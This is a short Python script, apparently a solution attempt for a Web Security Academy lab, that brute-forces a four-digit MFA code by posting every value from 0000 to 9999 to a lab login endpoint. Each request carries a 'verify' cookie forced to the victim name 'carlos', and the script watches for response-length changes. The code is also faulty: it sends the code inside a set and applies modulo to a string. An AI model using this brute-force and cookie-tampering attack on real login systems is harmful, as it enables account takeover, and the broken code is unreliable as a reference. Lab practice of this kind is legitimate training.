import requests

url = 'https://0ab5002203bf917180063a1900760043.web-security-academy.net/login2'

def username(url):
    pass





def password(url):
    length = 0
    for payload in range(10000):
        payload = str(payload).zfill(4)
        params = {f'mfa-code': {payload}}
        response = requests.post(url, data=params, cookies={'verify': 'carlos'})
        if length == 0:
                length = len(response.text)
        else:
                if length != len(response.text) or payload%100==0:
                    print(f"Payload: {payload} | response-length: {len(response.text)} | text: {response.cookies}")
                length = len(response.text)


password(url)


